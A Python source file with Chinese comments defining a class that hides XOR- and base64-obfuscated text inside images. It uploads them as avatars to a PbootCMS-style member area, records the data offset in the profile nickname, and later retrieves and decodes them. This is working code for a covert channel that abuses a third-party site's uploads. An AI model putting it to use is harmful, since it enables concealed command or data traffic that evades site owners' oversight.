import httpx
import os,shutil,json,time,base64
from lxml import etree

class Server():
    # 初始化
    def __init__(self,domain,PHPSESSID,key,passwd) -> None:
        self.domain = domain
        self.PHPSESSID = PHPSESSID
        self.key = key
        self.passwd = passwd
    
    # 文本转十六进制
    def string_to_hex_format(self,input_string):
        hex_representation = "".join([hex(ord(char))[2:] for char in input_string])
        return hex_representation

    # 十六转文本
    def hex_format_to_string(self,hex_format):
        hex_data = hex_format
        text_data = "".join([chr(int(hex_data[i:i+2], 16)) for i in range(0, len(hex_data), 2)])
        return text_data

    # xor
    def xor_encrypt(self,input_str):
        bytes_input = input_str.encode()
        bytes_key = self.key.encode()
        repeated_key = (self.key * (len(input_str) // len(self.key))) + self.key[:len(input_str) % len(self.key)]
        bytes_repeated_key = repeated_key.encode()
        result_bytes = bytes(x ^ y for x, y in zip(bytes_input, bytes_repeated_key))
        result_str = result_bytes.decode()
        return result_str

    # 反转
    def reverse_string(self,input_string):
        return input_string[::-1]

    # 数据植入图片
    def inject_img(self,img,txt,req):
        # 复制图片到相应的目录
        shutil.copyfile(img, req)
        tp = req
        # 将txt转化成十六进制
        binary_txt = self.string_to_hex_format(txt)
        # 进行简单的反转异或and base64
        binary_txt = self.reverse_string(binary_txt)
        binary_txt = self.xor_encrypt(binary_txt)
        binary_txt=binary_txt.encode()
        binary_txt = base64.b64encode(binary_txt)
        # 将数据注入到图片里面去
        psize = os.path.getsize(tp)
        f = open(tp,'ab+')
        f.seek(psize)
        f.write(binary_txt)
        newsize = os.path.getsize(tp)
        if newsize>psize or newsize==psize:
            return psize,tp
        else:
            return 0,tp
        
    # 发送数据：
    def send_img(self,file_path):
        url = self.domain+"/?member/upload/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "X-Requested-With": "XMLHttpRequest",
            "Cookie": "PbootSystem={}".format(self.PHPSESSID), 
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        filename = file_path.split('/')[-1]
        data = {
            "upload": (filename, open(file_path, "rb"), "image/jpg"),
        }
        with httpx.Client() as client:
            response = client.post(url, headers=headers, files=data)
        fh = response.text
        js_fh =json.loads(fh)
        pl = js_fh["data"][0]
        return pl 
    
    # 发送偏移量
    def sed_pyl(self,psize,ptpath):
        url = self.domain+"/?member/umodify/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "PbootSystem={}".format(self.PHPSESSID),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
        }
        data = {
            "headpic": ptpath,
            "useremail": "",
            "usermobile": "",
            "nickname": "{}".format(psize),
            "password": "",
            "rpassword": "",
            "sex": "男",
            "birthday": "",
            "qq": "",
            "opassword": self.passwd,
        }
        with httpx.Client() as client:
            response = client.post(url, headers=headers, data=data)
        ll = response.text
        if "修改成" in ll:
            return 1
        else:
            return 0


    # 获取图片地址
    def get_tp(self):
        url = self.domain+"/?member/ucenter/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Cookie": "PbootSystem={}".format(self.PHPSESSID),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
        }
        with httpx.Client() as client:
            response = client.get(url, headers=headers)
        data = etree.HTML(response.text)
        str = data.xpath('/html/body/div[3]/div[2]/div[3]/table/tbody/tr[4]/td[2]/img/@src')
        psize = data.xpath('/html/body/div[3]/div[2]/div[3]/table/tbody/tr[5]/td[2]/text()')[0]
        dz = str[0]
        return dz,psize
    
    # 获取图片，进行解密
    def get_tp_jm(self,tp_lj,psize):
        # 首先获取图片，并保存
        url = self.domain+tp_lj
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
        }
        con = httpx.get(url=url,headers=headers).content
        wjm = str(int(time.time()))
        wjj = 'result/'+wjm+'.png'
        with open(wjj,'wb')as f:
            f.write(con)
            f.close()
        # 将得到的图片进行解密
        # 解密顺数为 
        # 1.先读取偏移量之后的数据
        # 2.base64
        # 3.进行异或
        # 4.反转
        # 5.16进制转文本
        filename = wjj
        start_position = int(psize)
        with open(filename, 'rb') as file:
            file.seek(start_position)
            data_after_position = file.read()
            file.close()
        encrypted_data = base64.b64decode(data_after_position)
        encrypted_data = encrypted_data.decode() 
        decrypted_result = self.xor_encrypt(encrypted_data)
        decrypted_result = self.reverse_string(decrypted_result)
        decrypted_result = self.hex_format_to_string(decrypted_result)
        decrypted_result = decrypted_result.encode()
        decrypted_result = base64.b64decode(decrypted_result)
        decrypted_result = decrypted_result.decode()
        return decrypted_result



        



    
        
    
    

    


    